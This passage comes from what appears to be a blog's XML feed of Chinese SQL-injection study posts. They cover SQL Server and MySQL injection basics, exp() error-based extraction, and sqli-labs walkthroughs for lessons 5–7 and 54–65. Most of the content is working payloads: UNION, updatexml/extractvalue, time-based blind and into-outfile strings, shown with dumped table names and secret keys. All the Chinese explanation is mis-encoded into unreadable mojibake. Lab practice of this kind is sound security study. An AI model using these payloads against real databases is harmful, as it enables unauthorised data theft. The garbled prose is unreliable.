â€å§‹ç»ˆä¸ºå‡ã€‚æ‰€ä»¥è¿”å›žæ•°æ®ä¸ŽåŽŸå§‹è¯·æ±‚æœ‰å·®å¼‚ã€‚</p><p>å¦‚æžœä»¥ä¸Šä¸‰ä¸ªæ­¥éª¤å…¨éƒ¨æ»¡è¶³ï¼Œåˆ™ç¨‹åºå°±å¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´žã€‚</p><p>å¼ºç±»åž‹è¯­è¨€åœ¨è¿™æ–¹é¢æ¯”å¼±ç±»åž‹è¯­è¨€æœ‰ä¼˜åŠ¿ã€‚</p><p>2.å­—ç¬¦åž‹æ³¨å…¥</p><p>å½“è¾“å…¥å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œç§°ä¸ºå­—ç¬¦åž‹ã€‚æ•°å­—åž‹ä¸Žå­—ç¬¦åž‹æ³¨å…¥æœ€å¤§çš„åŒºåˆ«åœ¨äºŽ:æ•°å­—ç±»åž‹ä¸éœ€è¦å•å¼•å·é—­åˆï¼Œè€Œå­—ç¬¦ä¸²ç±»åž‹èˆ¬è¦ä½¿ç”¨å•å¼•å·æ¥é—­åˆã€‚</p><p>å­—ç¬¦åž‹æ³¨å…¥æœ€å…³é”®çš„æ˜¯å¦‚ä½•é—­åˆSQLè¯­å¥ä»¥åŠæ³¨é‡Šå¤šä½™çš„ä»£ç ã€‚</p><p>å½“æŸ¥è¯¢å†…å®¹ä¸ºå­—ç¬¦ä¸²æ—¶ï¼ŒSQLä»£ç å¦‚ä¸‹:</p><p>select * from  table where username =â€™adminâ€™</p><p>å½“æ”»å‡»è€…è¿›è¡ŒSQLæ³¨å…¥æ—¶ï¼Œå¦‚æžœè¾“å…¥â€œadmin and 1=1â€ï¼Œåˆ™æ— æ³•è¿›è¡Œæ³¨å…¥ã€‚å› ä¸ºâ€œadmin and1=1â€ä¼šè¢«æ•°æ®åº“å½“ä½œæŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼ŒSQLè¯­å¥å¦‚ä¸‹:</p><p>select * from table where username =â€™admin and 1=1â€™</p><p>è¿™æ—¶æƒ³è¦è¿›è¡Œæ³¨å…¥ï¼Œåˆ™å¿…é¡»æ³¨æ„å­—ç¬¦ä¸²é—­åˆé—®é¢˜ã€‚å¦‚æžœè¾“å…¥â€adminâ€™ and1=1â€“â€œå°±å¯ä»¥ç»§ç»­æ³¨å…¥ï¼ŒSQLè¯­å¥å¦‚ä¸‹:</p><p>select â˜…from table where username =â€™adminâ€™ and 1=1 â€“â€™</p><p>åªè¦æ˜¯å­—ç¬¦ä¸²ç±»åž‹æ³¨å…¥ï¼Œéƒ½å¿…é¡»é—­åˆå•å¼•å·ä»¥åŠæ³¨é‡Šå¤šä½™çš„ä»£ç ã€‚ä¾‹å¦‚ï¼Œupdate è¯­å¥: update Person set username =â€™username â€˜,set password= â€˜passwordâ€™ where id=1</p><p>çŽ°åœ¨å¯¹è¯¥SQLè¯­å¥è¿›è¡Œæ³¨å…¥ï¼Œå°±éœ€è¦é—­åˆå•å¼•å·ï¼Œå¯ä»¥åœ¨usernameæˆ–passwordå¤„æ’å…¥è¯­ å¥ä¸ºâ€œâ€™+(select @@version)+â€™â€ï¼Œæœ€ç»ˆæ‰§è¡Œçš„SQLè¯­å¥ä¸º:</p><p>update person set username=â€™usernameâ€™ , set password=â€™ â€˜+ (select@@version)+ â€˜ â€˜ where id=1 </p><p>åˆ©ç”¨ä¸¤æ¬¡å•å¼•å·é—­åˆæ‰å®ŒæˆSQLæ³¨å…¥ã€‚</p><p>äºŒã€order by è¯­å¥åˆ¤æ–­æ•°æ®è¡¨åˆ—æ•°ï¼Œä¾‹å¦‚ï¼š</p><p>order by 3ä¸æŠ¥é”™ï¼Œorder by 4 æŠ¥é”™ ï¼Œåˆ™æ•°æ®è¡¨æœ‰ä¸‰åˆ—</p><p>æ³¨ï¼šå¸¸ç”¨è¡¨è§†å›¾ï¼š</p><p>![76A13B7656A8D4B40651E87F62988610](D:\blog\source_posts\SQLæ³¨å…¥-1(SQL server)\76A13B7656A8D4B40651E87F62988610.png)</p><p>ä¸‰ï¼šUNIONæŸ¥è¯¢ï¼š</p><p>è”åˆæŸ¥è¯¢æ•æ„Ÿä¿¡æ¯</p><p>å¦‚æžœå¾—çŸ¥åˆ—æ•°ä¸º4ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­å¥ç»§ç»­æ³¨å…¥ï¼š</p><p>id=5 union select â€˜xâ€™,null,null,null from sysobject where xtype=â€™Uâ€™</p><p>å¦‚æžœç¬¬ä¸€åˆ—æ•°æ®ç±»åž‹ä¸åŒ¹é…ï¼Œæ•°æ®åº“å°†ä¼šæŠ¥é”™ï¼Œè¿™æ—¶å¯ä»¥ç»§ç»­é€’å½’æŸ¥è¯¢ï¼ŒçŸ¥é“è¯­å¥æ­£å¸¸æ‰§è¡Œä¸ºæ­¢ã€‚</p><p>id=5 union select null,â€™xâ€™,null,null from sysobject where xtype=â€™Uâ€™</p><p>id=5 union select null,null,â€™xâ€™,null from sysobject where xtype=â€™Uâ€™</p><p>è¯­å¥æ‰§è¡Œæ­£å¸¸ï¼Œä»£è¡¨æ•°æ®ç±»åž‹å…¼å®¹ï¼Œå°±å¯ä»¥å°†xæ›¿æ¢ä¸ºSQLè¯­å¥ï¼ŒæŸ¥è¯¢æ•æ„Ÿä¿¡æ¯ã€‚</p><p>å››ã€ä½¿ç”¨ç³»ç»Ÿå‡½æ•°ï¼š</p><p>select suser_name():è¿”å›žç”¨æˆ·çš„ç™»å½•æ ‡è¯†åï¼›</p><p>select user_name():åŸºäºŽæŒ‡å®šçš„æ ‡è¯†å·è¿”å›žæ•°æ®åº“ç”¨æˆ·åï¼›</p><p>select db_name():è¿”å›žæ•°æ®åº“åç§°ï¼›</p><p>select is_member(â€˜db_ownerâ€™):æ˜¯å¦ä¸ºæ•°æ®åº“è§’è‰²ï¼›</p><p>select convert(int,â€™5â€™):æ•°æ®ç±»åž‹è½¬æ¢ã€‚</p><p>æ³¨ï¼šSQL serverå¸¸ç”¨å‡½æ•°ï¼š</p><p>![E6530B94DE1FE160A7E73BE22883E2C2](D:\blog\source_posts\SQLæ³¨å…¥-1(SQL server)\E6530B94DE1FE160A7E73BE22883E2C2.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQlï¼šå‡½æ•°ï¼ˆæ›´æ–°ï¼‰</title>
      <link href="2021/07/16/sql-han-shu-geng-xin/"/>
      <url>2021/07/16/sql-han-shu-geng-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="å¸¸ç”¨å‡½æ•°ï¼š"><a href="#å¸¸ç”¨å‡½æ•°ï¼š" class="headerlink" title="å¸¸ç”¨å‡½æ•°ï¼š"></a>å¸¸ç”¨å‡½æ•°ï¼š</h1><p>addslashes()ï¼šless-33</p><p>ascii()ï¼šå°†æŸä¸ªå­—ç¬¦è½¬æ¢ ä¸º ascii å€¼<br>concat(str1,str2,â€¦)â€“ï¼šæ²¡æœ‰åˆ†éš”ç¬¦çš„è¿žæŽ¥å­—ç¬¦ä¸²</p><p>concat_ws(separator,str1,str2,â€¦)â€“ï¼šå«æœ‰åˆ†éš”ç¬¦çš„è¿žæŽ¥å­—ç¬¦ä¸²</p><p>count(*) å‡½æ•°è¿”å›žè¡¨ä¸­çš„è®°å½•æ•°</p><p>database()ï¼šæ˜¾ç¤ºæ•°æ®åº“åç§°</p><p>extractvalue() :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°ï¼ˆè§extractvalueï¼‰</p><p>floor()ï¼šæŠŠè¾“å‡ºçš„ç»“æžœå–æ•´</p><p>group byè¯­å¥ï¼šæŠŠç»“æžœåˆ†ç»„è¾“å‡º</p><p>group_concat(str1,str2,â€¦)ï¼šè¿žæŽ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</p><p>left(a,b)ï¼šä»Žå·¦ä¾§æˆªå– a çš„å‰ b ä½</p><p>length():åˆ¤æ–­é•¿åº¦</p><p>mid(a,b,c)ï¼šä»Žä½ç½® b å¼€å§‹ï¼Œæˆªå– a å­—ç¬¦ä¸²çš„ c ä½</p><p>mysql_real_escape_string()å‡½æ•°ï¼šless-36</p><p>preg_replace()ï¼šè§less23</p><p>rand()ï¼šéšæœºè¾“å‡ºä¸€ä¸ªå°äºŽ1çš„æ­£æ•°</p><p>substr(a,b,c)ï¼šä»Ž b ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦ï¼ˆä»Ž1å¼€å§‹æŽ’åºï¼‰</p><p>updatexml()ï¼šå‡½æ•°ä¸Žextractvalue()ç±»ä¼¼ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚ï¼ˆè§updatexmlï¼‰</p><p>user()ï¼šæ•°æ®åº“ç”¨æˆ·å<br>version()ï¼šmysqlç‰ˆæœ¬<br>@@datadirâ€“ï¼šæ•°æ®åº“è·¯å¾„<br>@@version_compile_osâ€“ï¼šæ“ä½œç³»ç»Ÿç‰ˆæœ¬</p><h1 id="ä¸€èˆ¬ç”¨äºŽå°è¯•çš„è¯­å¥ï¼š"><a href="#ä¸€èˆ¬ç”¨äºŽå°è¯•çš„è¯­å¥ï¼š" class="headerlink" title="ä¸€èˆ¬ç”¨äºŽå°è¯•çš„è¯­å¥ï¼š"></a>ä¸€èˆ¬ç”¨äºŽå°è¯•çš„è¯­å¥ï¼š</h1><p>Ps:â€“+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­ Url ç¼–ç åŽçš„#ä¸º%23<br>or 1=1â€“+<br> â€˜or 1=1â€“+<br> â€œor 1=1â€“+<br>)or 1=1â€“+<br> â€˜)or 1=1â€“+<br> â€œ) or 1=1â€“+<br>â€œ))or 1=1â€“+</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLï¼šä½¿ç”¨expè¿›è¡ŒSQLæŠ¥é”™æ³¨å…¥</title>
      <link href="2021/07/16/sql-shi-yong-exp-jin-xing-sql-bao-cuo-zhu-ru/"/>
      <url>2021/07/16/sql-shi-yong-exp-jin-xing-sql-bao-cuo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ³¨å…¥æ•°æ®ï¼š"><a href="#ä¸€ã€æ³¨å…¥æ•°æ®ï¼š" class="headerlink" title="ä¸€ã€æ³¨å…¥æ•°æ®ï¼š"></a>ä¸€ã€æ³¨å…¥æ•°æ®ï¼š</h1><p>å½“æ¶‰åŠåˆ°æ³¨å…¥æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨å¦å®šæŸ¥è¯¢æ¥é€ æˆâ€œ<code>DOUBLE value is out of range</code>â€çš„é”™è¯¯ã€‚ä½œè€…ä¹‹å‰çš„åšæ–‡æåˆ°çš„ï¼Œå°†0æŒ‰ä½å–åå°±ä¼šè¿”å›žâ€œ<code>18446744073709551615</code>â€ï¼Œå†åŠ ä¸Šå‡½æ•°æˆåŠŸæ‰§è¡ŒåŽè¿”å›ž0çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å°†æˆåŠŸæ‰§è¡Œçš„å‡½æ•°å–åå°±ä¼šå¾—åˆ°æœ€å¤§çš„æ— ç¬¦å·<code>BIGINT</code>å€¼ã€‚</p><pre><code>mysql&gt; select ~0;+----------------------+| ~0                   |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec) mysql&gt; select ~(select version());+----------------------+| ~(select version())  |+----------------------+| 18446744073709551610 |+----------------------+1 row in set, 1 warning (0.00 sec)</code></pre><p>æˆ‘ä»¬é€šè¿‡å­æŸ¥è¯¢ä¸ŽæŒ‰ä½æ±‚åï¼Œé€ æˆä¸€ä¸ª<code>DOUBLE overflow error</code>ï¼Œå¹¶å€Ÿç”±æ­¤æ³¨å‡ºæ•°æ®ã€‚</p><pre><code>&gt;`exp(~(select*from(select user())x))`    mysql&gt; select exp(~(select*from(select user())x));    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'</code></pre><h1 id="äºŒã€æ³¨å‡ºæ•°æ®ï¼š"><a href="#äºŒã€æ³¨å‡ºæ•°æ®ï¼š" class="headerlink" title="äºŒã€æ³¨å‡ºæ•°æ®ï¼š"></a>äºŒã€æ³¨å‡ºæ•°æ®ï¼š</h1><p>å¾—åˆ°è¡¨åï¼š</p><pre><code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</code></pre><p>å¾—åˆ°åˆ—åï¼š</p><pre><code>select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));</code></pre><p>æ£€ç´¢æ•°æ®ï¼š</p><pre><code>select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-7:æ–‡ä»¶å¯¼å…¥æ³¨å…¥</title>
      <link href="2021/07/16/sql-sqlilabs-less-7-wen-jian-dao-ru-zhu-ru/"/>
      <url>2021/07/16/sql-sqlilabs-less-7-wen-jian-dao-ru-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>å¯ä»¥ç›´æŽ¥å°†æŸ¥è¯¢è¯­å¥çš„ç»“æžœå†™å…¥æ–‡ä»¶ä¸­ï¼Œç„¶åŽè®¿é—®æ­¤æ–‡ä»¶å³å¯ã€‚</p><p>æ³¨æ„è¿™é‡Œçš„æ–‡ä»¶ä¸èƒ½æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶</p><h4 id="å†™å…¥ç”¨æˆ·ï¼Œåº“åï¼Œç‰ˆæœ¬å·ï¼š"><a href="#å†™å…¥ç”¨æˆ·ï¼Œåº“åï¼Œç‰ˆæœ¬å·ï¼š" class="headerlink" title="å†™å…¥ç”¨æˆ·ï¼Œåº“åï¼Œç‰ˆæœ¬å·ï¼š"></a>å†™å…¥ç”¨æˆ·ï¼Œåº“åï¼Œç‰ˆæœ¬å·ï¼š</h4><pre><code>?id=-1')) union select user(),database(),version() into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\1.txt" --+ </code></pre><h4 id="å†™å…¥è¡¨åï¼š"><a href="#å†™å…¥è¡¨åï¼š" class="headerlink" title="å†™å…¥è¡¨åï¼š"></a>å†™å…¥è¡¨åï¼š</h4><pre><code>?id=-1')) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\2.txt"--+</code></pre><h4 id="å†™å…¥åˆ—åï¼š"><a href="#å†™å…¥åˆ—åï¼š" class="headerlink" title="å†™å…¥åˆ—åï¼š"></a>å†™å…¥åˆ—åï¼š</h4><pre><code>?id=-1')) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\3.txt" --+ </code></pre><h4 id="å†™å…¥å­—æ®µï¼š"><a href="#å†™å…¥å­—æ®µï¼š" class="headerlink" title="å†™å…¥å­—æ®µï¼š"></a>å†™å…¥å­—æ®µï¼š</h4><pre><code>?id=-1'))  union select 1,2,group_concat(username,0x3a,password) from users into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\4.txt" --+ </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-54-65:challenges-æœ‰é™æœºä¼šçš„æ³¨å…¥11</title>
      <link href="2021/07/16/sql-sqlilabs-less-54-65-challenges-you-xian-ji-hui-de-zhu-ru/"/>
      <url>2021/07/16/sql-sqlilabs-less-54-65-challenges-you-xian-ji-hui-de-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-54-10æ¬¡æœºä¼š"><a href="#Less-54-10æ¬¡æœºä¼š" class="headerlink" title="Less-54 10æ¬¡æœºä¼š"></a>Less-54 10æ¬¡æœºä¼š</h2><p>æºç æœ€åŽæ³¨æŽ‰äº†é”™è¯¯æç¤ºï¼Œå¯ä»¥çœ‹åˆ°ç”¨äº†å¾ˆå¤šéšæœºå€¼åšæ‹¼æŽ¥ï¼Œnext_tryy();è¿™ä¸ªå‡½æ•°æ¯”è¾ƒäº®çœ¼ï¼ŒæŸ¥çœ‹challengesæ•°æ®åº“ï¼Œå‘çŽ°å­—æ®µtryyï¼Œå°±ä»£è¡¨ç€æ—¶é—´ï¼Œéšæ„ä¿®æ”¹æ—¶é—´æ¬¡æ•°</p><pre><code>&lt;?phpinclude '../sql-connections/sql-connect-1.php';include '../sql-connections/functions.php';$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; $times= 10;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column nameif(!isset($_POST['answer_key'])){    if(isset($_POST['reset'])){        setcookie('challenge', ' ', time() - 3600000);}    else{        if(isset($_COOKIE['challenge'])){            $sessid=$_COOKIE['challenge'];}        else{            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie("challenge", $hash, $expire);}        if(isset($_GET['id'])){            $id=$_GET['id'];            next_tryy();            $tryyy = view_attempts();                        if($tryyy &gt;= ($times+1)){                setcookie('challenge', ' ', time() - 3600000);}                $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            }}}&lt;?php}else{    $key = addslashes($_POST['key']);    $key = mysql_real_escape_string($key);    $sql="SELECT 1 FROM $table WHERE $col1= '$key'";    if($row){}else {//print_r(mysql_error());}}?&gt;</code></pre><h5 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h5><pre><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+</code></pre><p>zpmxcs1wwi</p><pre><code>?id=-1' union all select 1,group_concat(column_name),3 from information_schema.columns where table_name='zpmxcs1wwi'--+</code></pre><p>Your Login name:id,sessid,secret_59AZ,tryy<br>Your Password:3</p><pre><code>?id=-1' union select 1,2,(group_concat( concat_ws(0x7e,sessid,secret_59AZ,tryy))) from challenges.zpmxcs1wwi--+</code></pre><pre><code>?id=-1' union select 1,2,group_concat(secret_59AZ) from challenges.hcuhv04r8w--+</code></pre><p>Your Login name:2<br>Your Password:fbf50efd552a22190e4e76d28f87b072<del>0EUPSlL2MhoICNxHUeX4D4jI</del>3 </p><h2 id="Less-55-14æ¬¡æœºä¼š"><a href="#Less-55-14æ¬¡æœºä¼š" class="headerlink" title="Less-55 14æ¬¡æœºä¼š"></a>Less-55 14æ¬¡æœºä¼š</h2><p>é—­åˆæ–¹å¼ä¸ºå•æ‹¬å·ï¼Œå‰©ä¸‹çš„éƒ½å’Œäº”åå››å…³ä¸€æ ·</p><pre><code>?id=1) or sleep(5)--+</code></pre><h2 id="Less-56-14æ¬¡æœºä¼š"><a href="#Less-56-14æ¬¡æœºä¼š" class="headerlink" title="Less-56 14æ¬¡æœºä¼š"></a>Less-56 14æ¬¡æœºä¼š</h2><p>é—­åˆæ–¹å¼ä¸ºå•å¼•å·æ‹¬å·ï¼Œå‰©ä¸‹çš„éƒ½å’Œäº”åå››å…³ä¸€æ ·</p><pre><code>?id=1') or sleep(5)--+</code></pre><h2 id="Less-57-14æ¬¡æœºä¼š"><a href="#Less-57-14æ¬¡æœºä¼š" class="headerlink" title="Less-57 14æ¬¡æœºä¼š"></a>Less-57 14æ¬¡æœºä¼š</h2><p>é—­åˆæ–¹å¼ä¸ºåŒå¼•å·ï¼Œå‰©ä¸‹çš„éƒ½å’Œäº”åå››å…³ä¸€æ ·</p><pre><code>?id=1" or sleep(5)--+</code></pre><h2 id="Less-58-5æ¬¡æœºä¼š"><a href="#Less-58-5æ¬¡æœºä¼š" class="headerlink" title="Less-58 5æ¬¡æœºä¼š"></a>Less-58 5æ¬¡æœºä¼š</h2><p>unionè¢«ç¦ç”¨ï¼ˆæ‰€ä»¥åªèƒ½ç”¨æŠ¥é”™æ³¨å…¥ï¼‰</p><pre><code>?id=-1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')))--+</code></pre><p>æˆ–è€…</p><pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES')),1)--+</code></pre><p>p4fa6u9121</p><pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='p4fa6u9121' )),1)--+</code></pre><p>â€˜~id,sessid,secret_UFUT,tryyâ€™</p><pre><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_UFUT) from challenges.p4fa6u9121)),1)--+</code></pre><h2 id="Less-59-5æ¬¡æœºä¼š"><a href="#Less-59-5æ¬¡æœºä¼š" class="headerlink" title="Less-59 5æ¬¡æœºä¼š"></a>Less-59 5æ¬¡æœºä¼š</h2><pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES')),1)--+</code></pre><p>~s58vuqfkcd</p><pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from Information_schema.columns where table_name='s58vuqfkcd' )),1)--+</code></pre><p>~id,sessid,secret_SK4I,tryy</p><pre><code>?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_SK4I) from challenges.s58vuqfkcd)),1)--+</code></pre><p>~a62dnjQ7GwyliNtIWBjX6g1i</p><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>ä¸ŽLess-58å¤§ä½“ä¸€è‡´</p><p>é—­åˆæ–¹å¼ä¸ºåŒå¼•å·æ‹¬å·</p><pre><code>?id=1") or sleep(5)--+</code></pre><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>ä¸ŽLess-58å¤§ä½“ä¸€è‡´</p><p>é—­åˆæ–¹å¼ä¸ºåŒæ‹¬å·å•å¼•å·â€™))</p><pre><code>?id=1')) or sleep(5)--+</code></pre><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>å­—æ®µåè¡¨ååŠ¨æ€çš„ï¼Œæ²¡æ³•ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå°±åªèƒ½ç”¨å¸ƒå°”ç›²æ³¨äº†</p><p>æ•°æ®åº“åï¼Œä½¿ç”¨äºŒåˆ†æ³•ï¼Œä¸æ–­æ”¹å˜ifä¸­ç¬¬ä¸€éƒ¨åˆ†çš„åˆ¤æ–­æ¡ä»¶ï¼Œå…ˆåˆ¤æ–­å‡ºæ•°æ®åº“çš„é•¿åº¦</p><pre><code>?id=1') and if(length(database())&gt;9 , sleep(3), 1) --+</code></pre><pre><code>?id=1â€™) and if(length(database())=10,1,sleep(5))â€“+</code></pre><pre><code>ç¬¬ä¸€ä½å­—ç¬¦http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),1,1)='c',sleep(5),1)--+ç¬¬ä¸€ä½å­—ç¬¦asciiç ï¼ˆå½“ç„¶ä¸å¯èƒ½ä¸€ä¸Šæ¥å°±çœ‹å‡ºæ¥æ˜¯99ï¼Œå…ˆè¦å’Œå¾ˆå¤šæ•°å­—è¿›è¡ŒäºŒåˆ†å¤§äºŽå°äºŽçš„æ¯”è¾ƒï¼Œæ…¢æ…¢ç¡®å®šèŒƒå›´ï¼Œè¿™é‡Œæ›´å»ºè®®ç”¨asciiç ï¼‰http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),1,1))=99,sleep(5),1)--+asciiç payloadhttp://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),2,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),3,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),4,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),5,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),6,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),7,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),8,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),9,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select database()),10,1))=99,sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=52,sleep(5),1)--+å­—ç¬¦payloadhttp://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),2,1)='h',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),3,1)='a',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),4,1)='l',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),5,1)='l',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),6,1)='e',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),7,1)='n',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),8,1)='g',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),9,1)='e',sleep(5),1)--+http://192.168.239.138:86/Less-62/index.php/?id=1') and if(substr((select database()),10,1)='s',sleep(5),1)--+è¡¨ä¸ªæ•°http://192.168.239.138:86/Less-62/index.php/?id=1') and if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 1,sleep(5),1)--+ç¬¬ä¸€å¼ è¡¨é•¿åº¦http://192.168.239.138:86/Less-62/index.php/?id=1') and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=10,sleep(5),1)--+è¡¨çš„æ¯ä¸€ä½http://192.168.239.138:86/Less-62/index.php/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))&gt;15,sleep(5),1)--+</code></pre><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>é—­åˆæ–¹å¼ä¸ºå•å¼•å·â€™</p><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>é—­åˆæ–¹å¼ä¸ºåŒæ‹¬å·))</p><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>é—­åˆæ–¹å¼ä¸ºåŒå¼•å·å°æ‹¬å·â€)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-5-6:ç›²æ³¨</title>
      <link href="2021/07/16/sql-sqlilabs-less-5-6-mang-zhu/"/>
      <url>2021/07/16/sql-sqlilabs-less-5-6-mang-zhu/</url>
      
        <content type="html"><![CDATA[<p>æŽ¨èä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><h2 id="å¸ƒå°”-Boolean-æ³¨å…¥ï¼š"><a href="#å¸ƒå°”-Boolean-æ³¨å…¥ï¼š" class="headerlink" title="å¸ƒå°”(Boolean)æ³¨å…¥ï¼š"></a>å¸ƒå°”(Boolean)æ³¨å…¥ï¼š</h2><h4 id="åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼š"><a href="#åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼š" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼š"></a>åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼š</h4><pre><code>?id=1' and length(database())&gt;0--+</code></pre><p>?id=1â€™ and length(database())=8â€“+ å¾—åˆ°â€œyouâ€™re inâ€¦â€çš„ç»“æžœï¼Œåˆ†æžæ•°æ®åº“æœ‰å…«ä½ï¼›</p><h4 id="ç¡®å®šæ•°æ®åº“åç§°ç»„æˆï¼š"><a href="#ç¡®å®šæ•°æ®åº“åç§°ç»„æˆï¼š" class="headerlink" title="ç¡®å®šæ•°æ®åº“åç§°ç»„æˆï¼š"></a>ç¡®å®šæ•°æ®åº“åç§°ç»„æˆï¼š</h4><pre><code>?id=1' and ascii(substr(database(),1,1)=83)--+</code></pre><p>è¿™é‡Œçš„sçš„ASCIIç ä¸º83ï¼Œä»¥æ­¤ç±»æŽ¨ï¼Œä¸€ä¸€æ¯”è¾ƒï¼›</p><h4 id="åˆ¤æ–­è¡¨çš„ä¸ªæ•°ï¼š"><a href="#åˆ¤æ–­è¡¨çš„ä¸ªæ•°ï¼š" class="headerlink" title="åˆ¤æ–­è¡¨çš„ä¸ªæ•°ï¼š"></a>åˆ¤æ–­è¡¨çš„ä¸ªæ•°ï¼š</h4><pre><code>?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;0--+</code></pre><h4 id="åˆ¤æ–­è¡¨çš„é•¿åº¦ï¼š"><a href="#åˆ¤æ–­è¡¨çš„é•¿åº¦ï¼š" class="headerlink" 